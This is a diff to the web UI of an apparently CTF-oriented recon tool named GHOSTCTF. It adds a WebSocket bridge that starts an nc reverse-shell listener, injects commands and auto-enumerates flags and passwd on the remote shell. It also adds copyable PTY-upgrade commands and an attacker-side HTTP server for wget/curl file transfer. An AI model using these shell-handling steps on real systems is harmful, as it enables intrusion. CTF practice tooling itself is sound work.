@@ -615,27 +615,96 @@
     overflow: hidden;
   }
 
+  .content-left {
+    display: flex;
+    flex-direction: column;
+    min-height: 0;
+    overflow: hidden;
+    border-right: 1px solid var(--border);
+  }
+
+  .content-left .terminal {
+    flex: 1;
+    min-height: 0;
+    border-right: none;
+  }
+
+  .shell-mini-panel {
+    flex-shrink: 0;
+    border: 1px solid var(--accent);
+    background: rgba(0, 0, 0, 0.35);
+    padding: 10px 12px;
+    margin-bottom: 14px;
+    max-height: 320px;
+    display: flex;
+    flex-direction: column;
+    gap: 8px;
+  }
+
+  .shell-mini-panel .shell-bridge-out-wrap {
+    max-height: 220px;
+    overflow: auto;
+    background: var(--bg);
+    border: 1px solid var(--border);
+    padding: 8px 10px;
+    margin-top: 8px;
+    font-family: var(--mono);
+    font-size: 10px;
+    line-height: 1.45;
+    white-space: pre-wrap;
+    word-break: break-all;
+  }
+
+  .shell-bridge-out-wrap .sb-err { color: var(--accent4); }
+  .shell-bridge-out-wrap .sb-out { color: var(--text-bright); }
+
   /* ===== TERMINAL LOG ===== */
   .terminal {
     background: var(--bg);
-    border-right: 1px solid var(--border);
-    overflow-y: auto;
+    border-right: none;
+    display: flex;
+    flex-direction: column;
+    min-height: 0;
+    flex: 1;
+    overflow: hidden;
     padding: 20px;
+  }
+
+  .terminal-scroll {
+    flex: 1;
+    min-height: 0;
+    overflow-y: auto;
     scrollbar-width: thin;
     scrollbar-color: var(--border) transparent;
   }
 
-  .terminal::-webkit-scrollbar { width: 4px; }
-  .terminal::-webkit-scrollbar-thumb { background: var(--border); }
+  .terminal-scroll::-webkit-scrollbar { width: 4px; }
+  .terminal-scroll::-webkit-scrollbar-thumb { background: var(--border); }
 
   .terminal-header {
     font-family: var(--mono);
     font-size: 10px;
     color: var(--text-dim);
-    margin-bottom: 16px;
+    margin-bottom: 12px;
     display: flex;
     align-items: center;
     gap: 12px;
+    flex-wrap: wrap;
+  }
+
+  .terminal-header .shell-mini-toggle {
+    margin-left: auto;
+    font-family: var(--mono);
+    font-size: 9px;
+    padding: 5px 10px;
+    cursor: pointer;
+    border: 1px solid var(--border);
+    background: var(--bg2);
+    color: var(--accent);
+  }
+
+  .terminal-header .shell-mini-toggle:hover {
+    border-color: var(--accent);
   }
 
   .term-line {
@@ -1071,6 +1140,31 @@
         </div>
       </div>
 
+      <div style="margin-top:10px;border:1px solid var(--border);padding:10px;background:var(--bg2)">
+        <div class="section-label" style="margin-bottom:6px">Shell reversa — PTY</div>
+        <p style="font-size:9px;color:var(--text-dim);margin:0 0 8px;line-height:1.45">Depois do <code style="color:var(--text-bright)">nc</code> / shell cru, cola no alvo na sequência:</p>
+        <div style="display:flex;flex-direction:column;gap:6px;font-family:var(--mono);font-size:9px">
+          <div style="display:flex;align-items:center;gap:8px;justify-content:space-between;flex-wrap:wrap;border:1px solid var(--border);padding:6px 8px;background:var(--bg)">
+            <span style="color:var(--text);word-break:break-all;flex:1;min-width:0">① script -qc /bin/bash /dev/null</span>
+            <button type="button" class="export-btn" style="flex-shrink:0;padding:4px 10px;font-size:9px" onclick="copyPtyShellStep(0)">Copiar</button>
+          </div>
+          <div style="display:flex;align-items:center;gap:8px;justify-content:space-between;flex-wrap:wrap;border:1px solid var(--border);padding:6px 8px;background:var(--bg)">
+            <span style="color:var(--text);word-break:break-all;flex:1;min-width:0">② export TERM=xterm</span>
+            <button type="button" class="export-btn" style="flex-shrink:0;padding:4px 10px;font-size:9px" onclick="copyPtyShellStep(1)">Copiar</button>
+          </div>
+          <div style="display:flex;align-items:center;gap:8px;justify-content:space-between;flex-wrap:wrap;border:1px solid var(--border);padding:6px 8px;background:var(--bg)">
+            <span style="color:var(--text);word-break:break-all;flex:1;min-width:0">③ python3 -c 'import pty; pty.spawn("/bin/bash")'</span>
+            <button type="button" class="export-btn" style="flex-shrink:0;padding:4px 10px;font-size:9px" onclick="copyPtyShellStep(2)">Copiar</button>
+          </div>
+        </div>
+        <div class="section-label" style="margin-top:12px;margin-bottom:6px">Servidor HTTP (máquina atacante)</div>
+        <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;font-family:var(--mono);font-size:9px">
+          <label style="color:var(--text-dim);display:flex;align-items:center;gap:6px">Porta <input id="httpServePort" type="text" inputmode="numeric" value="8000" style="width:64px;background:var(--bg);border:1px solid var(--border);color:var(--text);font-family:var(--mono);font-size:10px;padding:5px 6px"></label>
+          <button type="button" class="export-btn" style="padding:4px 10px;font-size:9px" onclick="copyPythonHttpServer()">Copiar python3 -m http.server</button>
+        </div>
+        <p style="font-size:8px;color:var(--text-dim);margin:8px 0 0;line-height:1.4">Corre no teu Kali/host onde queres servir ficheiros; no alvo usa <code style="color:var(--text-bright)">wget</code>/<code style="color:var(--text-bright)">curl</code> para o teu IP:porta.</p>
+      </div>
+
       <div class="section-label" style="margin-top:18px">Histórico (SQLite)</div>
       <div id="runsHistory" style="font-family:var(--mono);font-size:10px;color:var(--text-dim);max-height:120px;overflow-y:auto;line-height:1.5">
         <span id="runsHistoryEmpty">Carregando…</span>
@@ -1119,6 +1213,17 @@
         <label class="checkbox-item"><input type="checkbox" class="mod" value="credReuseProbe"><div class="checkbox-box"></div><span class="checkbox-text">Credential Reuse (FTP/HTTP basic)</span><span class="tag tag-med">OFF</span></label>
         <label class="checkbox-item"><input type="checkbox" class="mod" value="wpFocusProbe"><div class="checkbox-box"></div><span class="checkbox-text">WordPress Focus (wp-login/xmlrpc/wp-json/plugins)</span><span class="tag tag-med">OFF</span></label>
         <label class="checkbox-item"><input type="checkbox" class="mod" value="wpScanProbe"><div class="checkbox-box"></div><span class="checkbox-text">WPScan probe (heavy, optional)</span><span class="tag tag-med">OFF</span></label>
+        <label class="checkbox-item"><input type="checkbox" class="mod" value="etcHostsProbe" id="modEtcHostsProbe"><div class="checkbox-box"></div><span class="checkbox-text">Hostnames (/etc/hosts) — curl após recon no IP</span><span class="tag tag-med">OFF</span></label>
+        <div id="extraHostsWrap" style="display:none;margin:6px 0 14px;padding:10px 12px;border:1px solid var(--border);background:var(--bg2)">
+          <div style="font-size:9px;color:var(--text-dim);line-height:1.5;margin-bottom:8px">
+            Configura antes no teu sistema <code style="color:var(--text-bright)">/etc/hosts</code> o mesmo IP do alvo (ex.: <code style="color:var(--text-bright)">3.4.5.6 challenge.ctf</code>). Aqui cola os <strong>mesmos</strong> hostnames — um por linha ou separados por vírgula. O Node corre no teu PC: o DNS/hosts local tem de resolver estes nomes para o IP.
+          </div>
+          <textarea id="extraHostsInput" placeholder="challenge.ctf&#10;app.target.local" autocomplete="off" spellcheck="false" style="width:100%;min-height:76px;background:var(--bg);border:1px solid var(--border);color:var(--text);font-family:var(--mono);font-size:10px;padding:8px;resize:vertical"></textarea>
+          <label style="display:flex;gap:10px;align-items:flex-start;margin-top:10px;font-size:9px;color:var(--text-dim);line-height:1.45;cursor:pointer;user-select:none">
+            <input type="checkbox" id="hostsOnlyWebChk" style="margin-top:3px;flex-shrink:0">
+            <span><strong style="color:var(--accent2)">Só hostnames</strong> — não repetir o curl em <code>http(s)://IP</code> (poupa tempo se já fizeste recon no IP). O <strong>nmap</strong> e FTP/SSH/MySQL continuam no IP. Para cada nome: mesma lógica de recon web que no IP, e neste modo também se tentam as <strong>portas HTTP típicas</strong> (80, 443, 8080, …) além do que o nmap marcou como http — por si o IP e o nome partilham portas TCP, mas assim não falhas um serviço web “mal classificado”. Robots/sitemap/.well-known usam os <strong>nomes</strong> como fallback se não houver respostas HTTP válidas (em vez de voltar ao IP). O resto do pipeline (links, dir enum, …) é o mesmo sobre todas as respostas.</span>
+          </label>
+        </div>
       </div>
 
       <div class="module-group">
@@ -1219,15 +1324,43 @@
     <!-- Content -->
     <div class="content-area">
 
-      <!-- Terminal -->
+      <div class="content-left">
+      <!-- Terminal: log + mini-terminal nc no mesmo painel -->
       <div class="terminal" id="terminal">
         <div class="terminal-header">
           <span style="color:var(--red)">●</span>
           <span style="color:var(--accent4)">●</span>
           <span style="color:var(--accent2)">●</span>
           <span style="margin-left:8px">GHOSTCTF // CTF PIPELINE LOG</span>
+          <button type="button" class="shell-mini-toggle" id="shellMiniToggleBtn" onclick="shellToggleMini()" title="Mostra ou esconde o nc + injeção de comandos">Mini-terminal nc ▾</button>
         </div>
 
+        <div id="shellMiniPanel" class="shell-mini-panel" style="display:none">
+          <div style="font-size:9px;color:var(--text-dim);line-height:1.5">
+            <span style="color:var(--accent2)">①</span> <strong>Iniciar nc</strong> — o Node corre <code style="color:var(--text-bright)">nc -nlvp PORTA</code> no teu PC.
+            <span style="color:var(--accent2)">②</span> No alvo, reverse shell para <strong>teu IP:porta</strong>.
+            <span style="color:var(--accent2)">③</span> Saída na caixa; <strong>Injetar</strong> = campo em baixo (Enter) ou botões <code>ls</code>/<code>grep</code>.
+            <span style="display:block;margin-top:6px;font-size:8px;color:var(--accent3)">Ngrok TCP: <code>ngrok tcp PORTA</code> · UI remota: <code>GHOSTCTF_SHELL_WS_ANY=1</code></span>
+          </div>
+          <div style="display:flex;flex-wrap:wrap;gap:8px;align-items:center;font-family:var(--mono);font-size:10px">
+            <label style="color:var(--text-dim)">Porta <input id="shellBridgePort" type="text" inputmode="numeric" value="4444" style="width:56px;background:var(--bg);border:1px solid var(--border);color:var(--text);font-family:var(--mono);font-size:10px;padding:5px 6px"></label>
+            <button type="button" class="export-btn" id="shellBridgeBtnStart" onclick="shellBridgeStart()">Iniciar nc</button>
+            <button type="button" class="export-btn" id="shellBridgeBtnStop" onclick="shellBridgeStop()" disabled>Parar</button>
+            <button type="button" class="export-btn" onclick="shellBridgeSendPreset('ls -la')" title="Injeta na shell">ls -la</button>
+            <button type="button" class="export-btn" onclick="shellBridgeSendGrepFlag()" title="Injeta na shell">grep Solyd{</button>
+          </div>
+          <div style="display:flex;flex-wrap:wrap;gap:8px;align-items:center;margin-top:4px">
+            <button type="button" class="export-btn" id="shellBridgeBtnAuto" onclick="shellBridgeAutoExplore()" title="Primeiro: script + TERM + pty; depois enum (ls, flags, passwd…). Liga a shell antes.">Enum CTF automático</button>
+            <button type="button" class="export-btn" id="shellBridgeBtnAutoAbort" onclick="shellBridgeAutoExploreAbort()" disabled>Parar enum auto</button>
+          </div>
+          <div id="shellBridgeStatus" style="font-size:9px;color:var(--text-dim);min-height:14px"></div>
+          <pre class="shell-bridge-out-wrap" id="shellBridgeOut" aria-label="Saída nc / shell remota"></pre>
+          <div style="display:flex;gap:8px;align-items:center">
+            <input type="text" id="shellBridgeInput" placeholder="Injetar comando (Enter envia à shell ligada)" autocomplete="off" spellcheck="false" style="flex:1;min-width:0;background:var(--bg);border:1px solid var(--border);color:var(--text);font-family:var(--mono);font-size:10px;padding:7px 9px" disabled onkeydown="shellBridgeInputKey(event)">
+          </div>
+        </div>
+
+        <div class="terminal-scroll" id="termScroll">
         <div id="termContent">
           <div class="empty-state">
             <pre class="empty-ascii">
@@ -1248,6 +1381,8 @@
             <div class="empty-msg">AGUARDANDO IP // INSERT IP TO BEGIN</div>
           </div>
         </div>
+        </div>
+      </div>
       </div>
 
       <!-- Findings Panel -->
@@ -1354,7 +1489,9 @@ function addLog(msg, type = 'info') {
   div.className = `term-line term-${type}`;
   div.innerHTML = `<span class="term-time">${now}</span><span class="term-prefix">${prefixes[type] || '[*]'}</span><span class="term-msg">${msg}</span>`;
   el.appendChild(div);
-  el.parentElement.scrollTop = el.parentElement.scrollHeight;
+  const ts = document.getElementById('termScroll');
+  if (ts) ts.scrollTop = ts.scrollHeight;
+  else if (el.parentElement) el.parentElement.scrollTop = el.parentElement.scrollHeight;
 }
 
 // ─── PIPELINE CONTROL ────────────────────────────────────
@@ -1531,6 +1668,271 @@ function showIntelMergeBanner(target, intel) {
 function copyText(t) {
   navigator.clipboard.writeText(t).catch(()=>{});
 }
+
+const PTY_SHELL_STEPS = [
+  'script -qc /bin/bash /dev/null',
+  'export TERM=xterm',
+  'python3 -c \'import pty; pty.spawn("/bin/bash")\'',
+];
+
+function copyPtyShellStep(i) {
+  const s = PTY_SHELL_STEPS[Number(i)];
+  if (s) copyText(s);
+}
+
+function copyPythonHttpServer() {
+  const raw = document.getElementById('httpServePort')?.value?.trim() || '8000';
+  const port = /^\d{1,5}$/.test(raw) ? raw : '8000';
+  copyText(`python3 -m http.server ${port}`);
+}
+
+function getShellWsUrl() {
+  const base = getApiBase();
+  if (base) {
+    const u = new URL(base);
+    u.protocol = u.protocol === 'https:' ? 'wss:' : 'ws:';
+    u.pathname = '/api/ghostctf/shell-ws';
+    u.search = '';
+    u.hash = '';
+    return u.toString();
+  }
+  const proto = window.location.protocol === 'https:' ? 'wss' : 'ws';
+  return `${proto}://${window.location.host}/api/ghostctf/shell-ws`;
+}
+
+let shellBridgeWs = null;
+let shellBridgeAwaitingStart = false;
+
+/** Mostra / esconde o mini-terminal nc (mesmo painel que o log). */
+function shellToggleMini() {
+  const p = document.getElementById('shellMiniPanel');
+  const b = document.getElementById('shellMiniToggleBtn');
+  if (!p || !b) return;
+  const hidden = p.style.display === 'none' || window.getComputedStyle(p).display === 'none';
+  if (hidden) {
+    p.style.display = 'flex';
+    b.textContent = 'Mini-terminal nc ▴';
+    setTimeout(() => document.getElementById('shellBridgePort')?.focus(), 30);
+  } else {
+    p.style.display = 'none';
+    b.textContent = 'Mini-terminal nc ▾';
+  }
+}
+
+function shellBridgeApplyUi(state) {
+  const start = document.getElementById('shellBridgeBtnStart');
+  const stop = document.getElementById('shellBridgeBtnStop');
+  const inp = document.getElementById('shellBridgeInput');
+  if (!start || !stop || !inp) return;
+  if (state === 'listening') {
+    start.disabled = true;
+    stop.disabled = false;
+    inp.disabled = false;
+  } else if (state === 'busy') {
+    start.disabled = true;
+    stop.disabled = false;
+    inp.disabled = true;
+  } else {
+    start.disabled = false;
+    stop.disabled = true;
+    inp.disabled = true;
+  }
+}
+
+function shellBridgeClearOut() {
+  const pre = document.getElementById('shellBridgeOut');
+  if (pre) pre.innerHTML = '';
+}
+
+function shellBridgeAppendChunk(text, isErr) {
+  const pre = document.getElementById('shellBridgeOut');
+  if (!pre) return;
+  const span = document.createElement('span');
+  span.className = isErr ? 'sb-err' : 'sb-out';
+  span.textContent = text;
+  pre.appendChild(span);
+  pre.scrollTop = pre.scrollHeight;
+}
+
+function shellBridgeAppendAutoExplore(msg) {
+  const pre = document.getElementById('shellBridgeOut');
+  if (!pre || !msg) return;
+  const div = document.createElement('div');
+  div.style.cssText =
+    'margin:6px 0 2px;padding:6px 0;border-top:1px dashed rgba(0,255,136,0.35);font-size:9px;color:var(--accent2);font-family:var(--mono)';
+  if (msg.phase === 'start') div.textContent = `━━ ${msg.message} ━━`;
+  else if (msg.phase === 'step') div.textContent = `▶ [${msg.index}/${msg.total}] ${msg.label}`;
+  else if (msg.phase === 'reactive') {
+    div.style.color = 'var(--accent4)';
+    div.textContent = `⚡ reativo [${msg.index}/${msg.total}] ${msg.label}`;
+  } else if (msg.phase === 'done') div.textContent = `✓ ${msg.message}`;
+  else if (msg.phase === 'aborted') div.textContent = `✗ ${msg.message}`;
+  else if (msg.phase === 'error') div.textContent = `✗ ERRO: ${msg.message}`;
+  else div.textContent = JSON.stringify(msg);
+  pre.appendChild(div);
+  pre.scrollTop = pre.scrollHeight;
+}
+
+function shellBridgeAutoExplore() {
+  if (!shellBridgeWs || shellBridgeWs.readyState !== WebSocket.OPEN) {
+    addLog('[shell] Abre o mini-terminal, Iniciar nc, e liga a reverse shell antes do enum automático.', 'warn');
+    return;
+  }
+  shellBridgeWs.send(JSON.stringify({ type: 'autoExplore' }));
+  addLog('[shell] Enum CTF automático iniciado (vê marcas ▶ na saída).', 'info');
+}
+
+function shellBridgeAutoExploreAbort() {
+  if (shellBridgeWs && shellBridgeWs.readyState === WebSocket.OPEN) {
+    shellBridgeWs.send(JSON.stringify({ type: 'autoExploreAbort' }));
+  }
+}
+
+function shellBridgeStart() {
+  if (typeof WebSocket === 'undefined') {
+    addLog('[shell] WebSocket não disponível neste browser.', 'error');
+    return;
+  }
+  if ((window.location.protocol === 'file:' || window.location.protocol === 'blob:') && !getApiBase()) {
+    addLog('[shell] Define ghostctf_api_base no localStorage (URL do npm start) para usar o bridge.', 'warn');
+  }
+  shellBridgeHardStop();
+  shellBridgeAwaitingStart = false;
+  shellBridgeClearOut();
+  const portRaw = document.getElementById('shellBridgePort')?.value?.trim() || '4444';
+  const port = /^\d{1,5}$/.test(portRaw) ? Math.min(65535, Math.max(1, parseInt(portRaw, 10))) : 4444;
+  document.getElementById('shellBridgePort').value = String(port);
+  const st = document.getElementById('shellBridgeStatus');
+  if (st) st.textContent = 'A ligar WebSocket…';
+  shellBridgeApplyUi('busy');
+  const wsUrl = getShellWsUrl();
+  let ws;
+  try {
+    ws = new WebSocket(wsUrl);
+  } catch (e) {
+    addLog(`[shell] ${e?.message || e}`, 'error');
+    if (st) st.textContent = '';
+    shellBridgeApplyUi('idle');
+    return;
+  }
+  shellBridgeWs = ws;
+  ws.onopen = () => {
+    shellBridgeAwaitingStart = true;
+    ws.send(JSON.stringify({ type: 'start', port }));
+    addLog(`[shell] WebSocket ligado — a pedir nc na porta ${port}`, 'info');
+  };
+  ws.onmessage = (ev) => {
+    let msg;
+    try {
+      msg = JSON.parse(ev.data);
+    } catch {
+      return;
+    }
+    if (msg.type === 'stdout') shellBridgeAppendChunk(msg.data, false);
+    else if (msg.type === 'stderr') shellBridgeAppendChunk(msg.data, true);
+    else if (msg.type === 'autoExplore') {
+      shellBridgeAppendAutoExplore(msg);
+      const autoBtn = document.getElementById('shellBridgeBtnAuto');
+      const abortBtn = document.getElementById('shellBridgeBtnAutoAbort');
+      if (msg.phase === 'start') {
+        if (autoBtn) autoBtn.disabled = true;
+        if (abortBtn) abortBtn.disabled = false;
+        addLog(`[shell] Enum automático: ${msg.total || '?'} passo(s)`, 'info');
+      } else if (msg.phase === 'step') {
+        /* só eco na caixa */
+      } else if (msg.phase === 'done' || msg.phase === 'aborted' || msg.phase === 'error') {
+        if (autoBtn) autoBtn.disabled = false;
+        if (abortBtn) abortBtn.disabled = true;
+        if (msg.phase === 'done') addLog('[shell] Enum automático concluído.', 'success');
+        else if (msg.phase === 'error') addLog(`[shell] Enum auto: ${msg.message}`, 'error');
+      }
+    } else if (msg.type === 'started') {
+      shellBridgeAwaitingStart = false;
+      if (st) st.textContent = `A escutar :${port} — ${msg.cmd}. Liga a reverse shell ao teu IP.`;
+      addLog(`[shell] ${msg.cmd}`, 'success');
+      shellBridgeApplyUi('listening');
+    } else if (msg.type === 'exit') {
+      if (st) st.textContent = `nc terminou (código ${msg.code ?? '?'})`;
+      addLog(`[shell] nc terminou (exit ${msg.code ?? '?'})`, 'warn');
+      shellBridgeApplyUi('idle');
+      shellBridgeWs = null;
+    } else if (msg.type === 'stopped') {
+      if (st) st.textContent = 'Parado.';
+      shellBridgeApplyUi('idle');
+    } else if (msg.type === 'error') {
+      addLog(`[shell] ${msg.message}`, 'error');
+      if (st) st.textContent = msg.message;
+      if (shellBridgeAwaitingStart) {
+        shellBridgeAwaitingStart = false;
+        shellBridgeApplyUi('idle');
+        try {
+          ws.close();
+        } catch {}
+      }
+    }
+  };
+  ws.onerror = () => {
+    addLog('[shell] Erro WebSocket — usa a UI em http://127.0.0.1:PORT (npm start) e só localhost.', 'error');
+  };
+  ws.onclose = () => {
+    shellBridgeAwaitingStart = false;
+    shellBridgeApplyUi('idle');
+    if (shellBridgeWs === ws) shellBridgeWs = null;
+    const autoBtn = document.getElementById('shellBridgeBtnAuto');
+    const abortBtn = document.getElementById('shellBridgeBtnAutoAbort');
+    if (autoBtn) autoBtn.disabled = false;
+    if (abortBtn) abortBtn.disabled = true;
+  };
+}
+
+function shellBridgeHardStop() {
+  if (shellBridgeWs && shellBridgeWs.readyState === WebSocket.OPEN) {
+    try {
+      shellBridgeWs.send(JSON.stringify({ type: 'stop' }));
+    } catch {}
+    try {
+      shellBridgeWs.close();
+    } catch {}
+  }
+  shellBridgeWs = null;
+}
+
+function shellBridgeStop() {
+  shellBridgeHardStop();
+  shellBridgeApplyUi('idle');
+  const st = document.getElementById('shellBridgeStatus');
+  if (st) st.textContent = 'Parado.';
+  const autoBtn = document.getElementById('shellBridgeBtnAuto');
+  const abortBtn = document.getElementById('shellBridgeBtnAutoAbort');
+  if (autoBtn) autoBtn.disabled = false;
+  if (abortBtn) abortBtn.disabled = true;
+  addLog('[shell] listener parado', 'info');
+}
+
+function shellBridgeSendPreset(cmd) {
+  if (!shellBridgeWs || shellBridgeWs.readyState !== WebSocket.OPEN) {
+    addLog('[shell] Inicia o nc e espera a shell ligar antes de enviar.', 'warn');
+    return;
+  }
+  const line = String(cmd).endsWith('\n') ? cmd : `${cmd}\n`;
+  shellBridgeWs.send(JSON.stringify({ type: 'stdin', data: line }));
+}
+
+function shellBridgeSendGrepFlag() {
+  shellBridgeSendPreset('grep -r Solyd{ . 2>/dev/null | head -80');
+}
+
+function shellBridgeInputKey(ev) {
+  if (ev.key !== 'Enter') return;
+  ev.preventDefault();
+  const inp = document.getElementById('shellBridgeInput');
+  if (!inp || inp.disabled) return;
+  const v = inp.value;
+  inp.value = '';
+  if (v.trim()) shellBridgeSendPreset(v);
+}
+
+shellBridgeApplyUi('idle');
 
 function filterFindings(f, el) {
   currentFilter = f;
@@ -1718,12 +2120,27 @@ async function startRecon() {
     v === 'disclosureProbe' ||
     v === 'credReuseProbe' ||
     v === 'wpFocusProbe' ||
-    v === 'wpScanProbe');
+    v === 'wpScanProbe' ||
+    v === 'etcHostsProbe');
 
   addLog(`Iniciando GHOSTCTF para: ${targetDomain}`, 'section');
   addLog(`Módulos (GhostCTF): ${modulesGhost.join(', ') || '(nenhum)' }`, 'info');
   addLog(`Plataforma: ${platform}`, 'info');
   addLog(`UDP scan: ${udpScan ? 'ON' : 'OFF'} | TCP all ports: ${tcpAllPorts ? 'ON' : 'OFF'}`, 'info');
+  const extraHostsList = String(document.getElementById('extraHostsInput')?.value || '')
+    .split(/[\n,]+/)
+    .map((s) => s.trim())
+    .filter(Boolean);
+  if (selectedMods.includes('etcHostsProbe')) {
+    addLog(
+      `Hostnames (/etc/hosts): ${extraHostsList.length ? extraHostsList.join(', ') : '(lista vazia — preenche antes do RUN)'}`,
+      extraHostsList.length ? 'info' : 'warn',
+    );
+    const hostsOnly = Boolean(document.getElementById('hostsOnlyWebChk')?.checked);
+    if (hostsOnly && extraHostsList.length) {
+      addLog('Modo só hostnames ON: sem curl inicial em http(s)://IP — só nos hostnames listados.', 'info');
+    }
+  }
   addLog('Conectando ao pipeline local (servidor Node)...', 'info');
 
   const finishOk = () => {
@@ -1749,6 +2166,8 @@ async function startRecon() {
         ip: targetDomain,
         platform,
         modules: modulesGhost,
+        extraHosts: selectedMods.includes('etcHostsProbe') ? extraHostsList : [],
+        hostsOnlyWeb: selectedMods.includes('etcHostsProbe') && Boolean(document.getElementById('hostsOnlyWebChk')?.checked),
         udpScan,
         tcpAllPorts,
       }),
@@ -2145,6 +2564,15 @@ document.querySelectorAll('input.mod').forEach((cb) => {
   cb.addEventListener('change', () => {
     updateModuleTags();
   });
+});
+
+document.getElementById('modEtcHostsProbe')?.addEventListener('change', (e) => {
+  const w = document.getElementById('extraHostsWrap');
+  if (w) w.style.display = e.target.checked ? 'block' : 'none';
+  if (!e.target.checked) {
+    const h = document.getElementById('hostsOnlyWebChk');
+    if (h) h.checked = false;
+  }
 });
 
 updatePlatformTags();
